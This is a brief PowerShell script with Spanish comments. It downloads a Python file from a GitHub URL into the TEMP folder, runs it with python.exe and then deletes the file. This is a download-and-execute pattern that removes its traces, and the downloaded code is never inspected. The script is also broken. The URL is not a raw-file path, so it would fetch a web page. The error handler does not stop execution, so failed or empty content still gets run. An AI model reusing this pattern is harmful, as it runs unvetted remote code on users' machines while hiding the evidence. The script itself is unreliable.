# URL de tu script de Python
$pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'

# Instalar los paquetes necesarios utilizando pip
pip install openpyxl

try {
    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
}
catch {
    # Manejar cualquier error que ocurra durante la descarga
    Write-Host "Ocurrió un error durante la ejecución del script."
}

# Ruta donde se guardará el script de Python
$pythonScriptPath = "$env:TEMP\script.py"

# Guardar el contenido descargado en un archivo
Set-Content -Path $pythonScriptPath -Value $response.Content

# Ejecutar el script de Python utilizando el intérprete de Python
python.exe $pythonScriptPath

# Limpiar el archivo descargado después de ejecutar el script
Remove-Item -Path $pythonScriptPath
